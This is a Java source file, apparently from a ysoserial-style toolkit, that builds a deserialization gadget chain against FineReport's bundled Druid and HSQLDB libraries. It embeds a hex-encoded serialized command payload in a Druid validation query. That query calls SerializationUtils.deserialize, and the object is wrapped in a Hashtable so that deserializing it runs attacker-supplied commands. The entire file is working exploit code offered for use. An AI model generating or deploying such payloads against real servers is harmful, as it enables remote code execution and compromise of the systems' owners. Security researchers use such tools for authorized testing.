package org.su18.ysuserial.payloads.gadgets;

import com.fr.json.JSONArray;
import com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.util.*;
import org.apache.commons.codec.binary.Hex;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.fr.third.alibaba.druid:x"})
@Authors({Authors.DEMO})
public class FineDruidHsqlLocal implements ObjectPayload<Object> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FineDruidHsqlLocal.class, args);
    }
    public Object getObject(final String command) throws Exception {
        FineJackson fineJackson = new FineJackson();
        Object hashmap = fineJackson.getObject(command);

        byte[] ser = FineUtils.serialize(hashmap);
        String hexpayload = Hex.encodeHexString(ser);

        DruidXADataSource druidXADataSource = new DruidXADataSource();
        druidXADataSource.setDriverClassName("com.fr.third.org.hsqldb.jdbcDriver");
        druidXADataSource.setValidationQuery("call \"com.fr.third.springframework.util.SerializationUtils.deserialize\"(CAST(X'"+hexpayload+"' AS VARBINARY(100000)))");
        // com.fr.third.org.hibernate.internal.util.SerializationHelper.deserialize
        // org.terracotta.modules.ehcache.collections.SerializationHelper#deserialize
        druidXADataSource.setInitialSize(1);
        Reflections.setFieldValue(druidXADataSource,"logWriter",null);
        Reflections.setFieldValue(druidXADataSource,"statLogger",null);
        Reflections.setFieldValue(druidXADataSource,"transactionHistogram",null);
        Reflections.setFieldValue(druidXADataSource,"initedLatch",null);

        druidXADataSource.setUrl("jdbc:hsqldb:mem:mydb");
        JSONArray jsonArray = new JSONArray(new ArrayList<>(Arrays.asList(druidXADataSource)));
        // fix error
//        ArrayList<Object> list = new ArrayList<>();
//        list.add(druidXADataSource);
//        JSONArray jsonArray = new JSONArray();
//        jsonArray.add(list);
        Hashtable hashtable = makeTableTstring(jsonArray);

//        byte[] payload = FineUtils.serialize(hashtable);
//        payload = FineUtils.GzipCompress(payload);

        return hashtable;
    }

    public static Hashtable makeTableTstring(Object o) throws Exception{
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
        Reflections.setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }

}
